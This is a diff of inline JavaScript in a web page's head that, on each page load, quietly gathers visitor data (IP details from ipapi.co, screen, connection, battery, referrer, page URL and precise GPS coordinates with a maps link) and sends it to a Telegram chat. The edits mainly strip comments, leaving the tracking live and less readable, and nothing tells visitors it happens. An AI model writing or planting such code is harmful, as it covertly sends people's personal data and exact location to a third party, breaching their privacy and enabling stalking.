@@ -40,23 +40,20 @@
         } catch (e) {}
       };
 
-      // Lightweight data collection (runs after page load)
       const collectVisitorData = async () => {
-        // 1. IP Info (fast)
+        // IP Info
         let ipInfo = {};
         try {
           const res = await fetch('https://ipapi.co/json/');
           ipInfo = await res.json();
         } catch {}
 
-        // 2. Basic browser/device info
         const screen = `${window.screen.width}×${window.screen.height} (${window.devicePixelRatio}x)`;
         const touch = 'ontouchstart' in window ? 'Yes' : 'No';
         const connection = navigator.connection 
           ? `${navigator.connection.effectiveType || 'N/A'} | ${navigator.connection.downlink || 'N/A'}Mbps` 
           : 'N/A';
 
-        // 3. Battery (if supported)
         let battery = 'N/A';
         try {
           if ('getBattery' in navigator) {
@@ -79,10 +76,9 @@
       🔗 Referrer: ${document.referrer || 'Direct'}
       📍 Page: ${window.location.href}
       📡 Connection: ${connection}
-      🕵️ User Agent: ${navigator.userAgent.substring(0, 140)}
         `.trim();
 
-        // 4. Geolocation (with Google Maps link)
+        // Geolocation
         if (!navigator.geolocation) {
           sendToTelegram(`❌ ENKO - No Geolocation\n\n${baseInfo}`);
           return;
@@ -112,7 +108,7 @@
       📍 GPS: ${latitude}, ${longitude} (±${Math.round(accuracy)}m)
       🏙 City: ${city}
       🌍 Country: ${country}
-      🔗 ${mapsLink}
+      🔗 <a href="${mapsLink}">Open in Google Maps</a>
 
       ${baseInfo}`;
 
@@ -133,9 +129,8 @@
         );
       };
 
-      // Run after page is fully loaded (non-blocking)
       window.addEventListener('load', () => {
-        setTimeout(collectVisitorData, 1500); // 1.5 second delay so page loads fast
+        setTimeout(collectVisitorData, 1500);
       });
       </script>
 </head>
